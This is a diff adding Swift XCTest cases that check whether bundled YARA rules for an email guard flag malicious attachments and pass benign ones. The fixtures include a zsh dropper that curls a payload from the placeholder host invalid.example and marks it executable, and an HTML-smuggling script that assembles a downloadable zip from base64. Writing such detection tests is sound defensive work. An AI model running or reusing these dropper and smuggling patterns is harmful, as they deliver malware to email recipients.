@@ -228,4 +228,57 @@ final class YARAEngineIntegrationTests: XCTestCase {
         XCTAssertFalse(afterBeta.isEmpty,  "BetaRule should match BETA file after reload")
         XCTAssertEqual(afterBeta.first?.ruleName, "BetaRule")
     }
+
+    // MARK: - Test 6: bundled Email Guard rules provide offline coverage
+
+    func test_bundledEmailGuardRules_detectHighConfidenceDroppers() async throws {
+        let projectRoot = URL(fileURLWithPath: #filePath)
+            .deletingLastPathComponent()
+            .deletingLastPathComponent()
+        let bundledRules = projectRoot.appendingPathComponent("Rules")
+        let engine = try YARAEngine(rulesDirectory: bundledRules.path)
+        try engine.reloadRules()
+
+        let shellDropper = tmpDir.appendingPathComponent("invoice.command")
+        try """
+            #!/bin/zsh
+            curl -fsSL https://invalid.example/payload -o /tmp/update
+            chmod +x /tmp/update
+            """.write(to: shellDropper, atomically: true, encoding: .utf8)
+
+        let htmlSmuggling = tmpDir.appendingPathComponent("statement.html")
+        try """
+            <script>
+            const bytes = Uint8Array.from(atob("AA=="), c => c.charCodeAt(0));
+            const payload = new Blob([bytes]);
+            const link = document.createElement("a");
+            link.href = URL.createObjectURL(payload);
+            link.download = "statement.zip";
+            </script>
+            """.write(to: htmlSmuggling, atomically: true, encoding: .utf8)
+
+        let shellMatches = try await engine.scanFile(at: shellDropper.path)
+        let htmlMatches = try await engine.scanFile(at: htmlSmuggling.path)
+        XCTAssertTrue(shellMatches.contains { $0.ruleName == "nick_email_shell_dropper" })
+        XCTAssertTrue(htmlMatches.contains { $0.ruleName == "nick_email_html_smuggling" })
+    }
+
+    func test_bundledEmailGuardRules_doNotFlagOrdinaryAttachments() async throws {
+        let projectRoot = URL(fileURLWithPath: #filePath)
+            .deletingLastPathComponent()
+            .deletingLastPathComponent()
+        let bundledRules = projectRoot.appendingPathComponent("Rules")
+        let engine = try YARAEngine(rulesDirectory: bundledRules.path)
+        try engine.reloadRules()
+
+        let benignScript = tmpDir.appendingPathComponent("cleanup.sh")
+        try """
+            #!/bin/zsh
+            echo "Cleaning local cache"
+            find "$HOME/Library/Caches/MyApp" -type f -mtime +30 -print
+            """.write(to: benignScript, atomically: true, encoding: .utf8)
+
+        let matches = try await engine.scanFile(at: benignScript.path)
+        XCTAssertTrue(matches.isEmpty, "Unexpected match: \(matches.map(\.ruleName))")
+    }
 }
